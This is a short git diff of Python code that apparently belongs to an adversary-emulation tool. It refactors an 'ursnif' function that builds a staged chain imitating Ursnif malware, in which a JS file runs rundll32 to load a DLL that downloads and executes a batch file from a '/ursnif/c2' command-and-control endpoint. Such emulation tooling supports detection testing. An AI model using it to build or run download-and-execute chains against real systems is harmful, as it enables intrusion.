@@ -9,7 +9,6 @@ from make.powershell.powershell import *
 from make.cmd.cmd import *
 from binascii import hexlify
 from make.exe.exe import *
-import urllib.parse
 
 from helpers import *
 from model import *
@@ -69,10 +68,7 @@ def ursnif(baseUrl) -> List[AceRoute]:
     # itsIt.db DLL will download & exec from: /ursnif/c2
 
     # Stage 3: DLL itsIt.db -> execute BAT <- C2
-    parsed_url = urllib.parse.urlparse(baseUrl)
-    host = parsed_url.hostname
-    port = parsed_url.port
-    itsItdb = makePeExecCmdC2(host, port, '/ursnif/c2', asDll=True)
+    itsItdb = makePeExecCmdC2(baseUrl, '/ursnif/c2', asDll=True)
     itsItdbFile: AceFile = makeAceFile('me/itsIt.db', itsItdb)
 
     # Stage 2: canWell.js -> 123.com/rundll32.exe -> itsIt.db
